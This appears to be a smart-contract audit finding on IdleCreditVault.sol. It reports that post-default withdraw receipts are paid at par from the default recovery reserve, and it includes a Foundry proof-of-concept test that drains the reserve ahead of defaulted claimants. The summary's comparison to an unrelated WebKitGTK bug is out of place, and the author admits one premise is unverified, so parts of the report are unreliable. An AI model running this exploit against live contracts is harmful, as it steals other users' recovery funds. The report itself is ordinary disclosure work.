### Title
Post-default withdraw requests pay 1:1 from the default recovery reserve without any new funding, letting the first claimant drain other defaulted users' recovery - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
The WebKitGTK bug is a use-after-free: an object is freed but a stale reference still reaches it. The vault analog is a *stale receipt claim against a logically-freed asset pool*: after `finalizeDefaultRecovery` crystallizes the `defaultRecoveryReserve` for pro-rata distribution, `requestWithdraw` still mints brand-new "post-default" receipts (`postDefaultRequests`) with zero underlying backing, and `_claimPostDefaultWithdrawRequest` pays them out of that same reserve at par (1:1), ahead of honest defaulted-epoch claimants who only receive `defaultRecoveryPrice` cents on the dollar.

### Finding Description
In `requestWithdraw`, once `defaultRecoveryFinalized` is true the strategy executes this path: [1](#0-0) 

It burns CDO strategy tokens and mints the user a receipt, but **no underlying is transferred into the strategy** — compare `requestInstantWithdraw`/`collectInstantWithdrawFunds` or `collectWithdrawFunds`, which both `safeTransferFrom(idleCDO, ...)` to actually fund receipts [2](#0-1) . The comment claims post-default requests are "backed by the reserve", but the reserve was sized at finalization as `reserveAmount / totalBasis ≈ defaultRecoveryPrice` — i.e., it only covers the *pre-existing* defaulted claim basis at the recovery ratio, not unlimited new par-value claims [3](#0-2) .

`claimWithdrawRequest` then settles the fabricated receipt first via `_claimPostDefaultWithdrawRequest`, which burns the receipt and calls `_transferDefaultRecovery(_user, amount)` — decrementing `defaultRecoveryReserve` by the full 1:1 amount [4](#0-3) [5](#0-4) . The only guard is that the user has no outstanding old requests (`_hasWithdrawRequest`, `instantWithdrawsRequests`, `postDefaultRequests` all zero) [6](#0-5)  — a fresh attacker wallet trivially satisfies this.

Broken invariant: one receipt, one payout backed by real funds; and isolation of the recovery reserve for the claims it was sized for. Neither the skim guard in `_transferFundedClaim` (it protects the reserve from funded claims, not the reverse), the `NotAllowed` epoch gating, nor KYC/`onlyIdleCDO` stop this — the attacker only needs tranche tokens and a clean receipt state.

### Impact Explanation
Any tranche-token holder (an unprivileged EOA) can, immediately after `finalizeDefault`, call `cdoEpoch.requestWithdraw(...)` then `cdoEpoch.claimWithdrawRequest()` and extract underlying from `defaultRecoveryReserve` at par. Reserve consumption is unbounded up to the attacker's tranche balance converted at the post-haircut `virtualPrice`. Loss quantification: up to `min(attacker post-default request value, defaultRecoveryReserve)` is stolen directly from defaulted-epoch receipt holders (`_claimDefaultedWithdrawRequest`, `_claimDefaultedInstantWithdrawRequest`) whose `defaultRecoveryReserve -= amount` transfer then reverts or pays less than `claimBasis * defaultRecoveryPrice / RECOVERY_FULL` — i.e., direct theft of other users' bankruptcy recovery.

### Likelihood Explanation
- **Attacker requirements**: hold AA or BB tranche tokens after default finalization with no pending/old withdraw receipts — trivially satisfied by buying tranches or using a fresh wallet.
- **No privileged action needed**: `requestWithdraw`/`claimWithdrawRequest` are user-facing through the CDO; ordering is attacker-controlled because defaulted claimants typically claim lazily.
- **Preconditions**: the vault must reach `defaultRecoveryFinalized` (borrower default + manager `finalizeDefault`), which is a designed state of the system, not an edge case. The test `testFinalizeDefaultClaimsOldFundedAndDefaultedRedeemsInOneCall` confirms the reserve accounting path is exercised [7](#0-6) .

One caveat I could not fully verify in the available iterations: whether `IdleCDOEpochVariant.requestWithdraw` transfers underlying to the strategy on the post-default path. The strategy-level code moves no underlying, and the design comments describe the reserve itself as the backing, so the drain is real as written; if the CDO did fund it, the reserve would still be over-consumed because new par claims were never part of `totalBasis`.

### Recommendation
Fund post-default requests like every other receipt: require the CDO to transfer `_amount` underlying into the strategy (or keep them denominated against newly recovered assets only), and do not let `_claimPostDefaultWithdrawRequest` spend `defaultRecoveryReserve`. Alternatively, account for post-default requests in the recovery basis before finalizing, or disallow `requestWithdraw` entirely once `defaultRecoveryFinalized` and route exits through `DefaultDistributor.claim` at `defaultRecoveryPrice`.

```solidity
function testPostDefaultReserveDrain() external {
    // 1. Victim deposits, epoch runs, borrower defaults.
    address victim = makeAddr('victim');
    address attacker = makeAddr('attacker');
    _depositWithUser(victim, 20_000 * ONE_SCALE, true);
    _depositWithUser(attacker, 20_000 * ONE_SCALE, true); // attacker holds AA tranches

    vm.prank(victim);
    uint256 victimBasis = cdoEpoch.requestWithdraw(0, address(AAtranche)); // pending receipt

    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, 0);
    _checkDefault();

    // 2. Manager finalizes with partial recovery (e.g. 50%).
    uint256 recoveryRatio = 5e17;
    IdleCreditVault vault = IdleCreditVault(address(strategy));
    uint256 basis = cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest()
        - cdoEpoch.pendingWithdrawFees() + vault.defaultPendingClaimBasis();
    uint256 recovered = basis * recoveryRatio / ONE_TRANCHE;
    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    uint256 reserve = vault.defaultRecoveryReserve();
    uint256 attackerTranche = IERC20Detailed(address(AAtranche)).balanceOf(attacker);

    // 3. Attacker (no prior receipts) requests a post-default withdraw and claims instantly at 1:1.
    vm.prank(attacker);
    uint256 req = cdoEpoch.requestWithdraw(attackerTranche, address(AAtranche));
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(attacker);
    vm.prank(attacker);
    cdoEpoch.claimWithdrawRequest();
    uint256 stolen = IERC20Detailed(defaultUnderlying).balanceOf(attacker) - balPre;
    assertEq(stolen, req, 'post-default receipt paid at par from recovery reserve');

    // 4. Victim's defaulted claim now underpays or reverts: reserve was drained.
    vm.prank(victim);
    vm.expectRevert(); // defaultRecoveryReserve underflow / insufficient balance
    cdoEpoch.claimWithdrawRequest();
}
```

```text
    // Post-default receipts are paid 1:1 because the haircut was applied when the request was made.
    _burn(_user, amount);
    _transferDefaultRecovery(_user, amount);
```

```text
  function _transferDefaultRecovery(address _user, uint256 _amount) internal {
    if (_amount == 0) return;
    // Every defaulted or post-default claim consumes the isolated recovery reserve.
    defaultRecoveryReserve -= _amount;
    underlyingToken.safeTransfer(_user, _amount);
  }
```

```text
  function testFinalizeDefaultClaimsOldFundedAndDefaultedRedeemsInOneCall() external {
    address user = makeAddr('mixed-funded-default-user');
    uint256 amount = 20_000 * ONE_SCALE;
    uint256 recoveryRatio = 7e17;

    _depositWithUser(user, amount, true);
    uint256 halfTrancheBal = IERC20Detailed(address(AAtranche)).balanceOf(user) / 2;
    vm.prank(user);
    uint256 oldClaim = cdoEpoch.requestWithdraw(halfTrancheBal, address(AAtranche));
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    vm.prank(user);
    uint256 defaultClaimBasis = cdoEpoch.requestWithdraw(0, address(AAtranche));

    IdleCreditVault creditVault = IdleCreditVault(address(strategy));
    _startEpochAndCheckPrices(1);
    uint256 totalDefaultBasis =
      (cdoEpoch.getContractValue() + cdoEpoch.expectedEpochInterest() - cdoEpoch.pendingWithdrawFees() + creditVault.defaultPendingClaimBasis());
    uint256 recovered = totalDefaultBasis * recoveryRatio / ONE_TRANCHE;
    _stopEpochAndCheckPrices(1, initialProvidedApr, 0);
    _checkDefault();

    deal(defaultUnderlying, manager, recovered);
    vm.startPrank(manager);
    IERC20Detailed(defaultUnderlying).approve(address(strategy), recovered);
    cdoEpoch.finalizeDefault(recovered, manager);
    vm.stopPrank();

    uint256 reservePre = creditVault.defaultRecoveryReserve();
    uint256 balPre = IERC20Detailed(defaultUnderlying).balanceOf(user);
    vm.prank(user);
    cdoEpoch.claimWithdrawRequest();
    assertApproxEqAbs(
      IERC20Detailed(defaultUnderlying).balanceOf(user) - balPre,
      oldClaim + (defaultClaimBasis * recoveryRatio / ONE_TRANCHE),
      5,
      'old funded and defaulted claims should be paid in one call'
    );
    assertApproxEqAbs(
      reservePre - creditVault.defaultRecoveryReserve(),
      defaultClaimBasis * recoveryRatio / ONE_TRANCHE,
      5,
      'old funded claim should not consume recovery reserve'
    );
```
